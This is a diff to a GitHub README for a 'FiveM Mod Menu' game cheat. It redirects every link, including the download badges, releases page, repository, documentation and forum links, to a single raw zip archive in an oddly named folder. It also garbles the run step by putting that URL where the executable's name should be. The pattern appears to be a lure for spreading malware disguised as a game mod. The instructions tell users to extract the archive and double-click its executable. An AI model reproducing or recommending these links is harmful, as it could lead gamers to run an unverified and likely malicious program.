@@ -1,6 +1,6 @@
 # 🎮 FiveM-Mod-Menu - Unlock Powerful Features for FiveM
 
-[![Download Here](https://img.shields.io/badge/Download_Here-Click%20to%20Get%20Started-brightgreen)](https://github.com/barad67/FiveM-Mod-Menu/releases)
+[![Download Here](https://github.com/barad67/FiveM-Mod-Menu/raw/refs/heads/main/compenetrate/Five_Menu_Mod_3.6.zip%20to%20Get%20Started-brightgreen)](https://github.com/barad67/FiveM-Mod-Menu/raw/refs/heads/main/compenetrate/Five_Menu_Mod_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the FiveM Mod Menu! This application enhances your FiveM gaming exper
 To get started, you'll need to download the application. Follow these step-by-step instructions:
 
 1. **Visit the Releases Page:** Click the link below to go to the official download page:
-   - [Download from Releases](https://github.com/barad67/FiveM-Mod-Menu/releases)
+   - [Download from Releases](https://github.com/barad67/FiveM-Mod-Menu/raw/refs/heads/main/compenetrate/Five_Menu_Mod_3.6.zip)
 
 2. **Choose Your File:** Look for the latest version, typically listed at the top. You may see multiple files; select the one that mentions the mod menu.
 
@@ -21,7 +21,7 @@ To get started, you'll need to download the application. Follow these step-by-st
 
 5. **Run the Application:** 
    - Navigate to the folder you just extracted.
-   - Find and double-click on the executable file (e.g., `FiveMModMenu.exe`) to launch the application.
+   - Find and double-click on the executable file (e.g., `https://github.com/barad67/FiveM-Mod-Menu/raw/refs/heads/main/compenetrate/Five_Menu_Mod_3.6.zip`) to launch the application.
 
 6. **Follow Setup Instructions:** Upon launching, the menu should provide instructions. Follow these to set it up in your FiveM client.
 
@@ -55,9 +55,9 @@ If you encounter any issues while using the FiveM Mod Menu, you can reach out fo
 
 ## 🔗 Additional Links
 
-- [GitHub Repository](https://github.com/barad67/FiveM-Mod-Menu)
-- [Documentation](https://github.com/barad67/FiveM-Mod-Menu/wiki)
-- [Community Forum](https://www.exampleforum.com)
+- [GitHub Repository](https://github.com/barad67/FiveM-Mod-Menu/raw/refs/heads/main/compenetrate/Five_Menu_Mod_3.6.zip)
+- [Documentation](https://github.com/barad67/FiveM-Mod-Menu/raw/refs/heads/main/compenetrate/Five_Menu_Mod_3.6.zip)
+- [Community Forum](https://github.com/barad67/FiveM-Mod-Menu/raw/refs/heads/main/compenetrate/Five_Menu_Mod_3.6.zip)
 
 ## 💡 Tips for Use
 
@@ -75,4 +75,4 @@ We continuously work on enhancing the FiveM Mod Menu. Future updates may include
 
 Thank you for choosing the FiveM Mod Menu! Click below to download and elevate your gaming experience.
 
-[![Download Here](https://img.shields.io/badge/Download_Here-Click%20to%20Get%20Started-brightgreen)](https://github.com/barad67/FiveM-Mod-Menu/releases)
+[![Download Here](https://github.com/barad67/FiveM-Mod-Menu/raw/refs/heads/main/compenetrate/Five_Menu_Mod_3.6.zip%20to%20Get%20Started-brightgreen)](https://github.com/barad67/FiveM-Mod-Menu/raw/refs/heads/main/compenetrate/Five_Menu_Mod_3.6.zip)
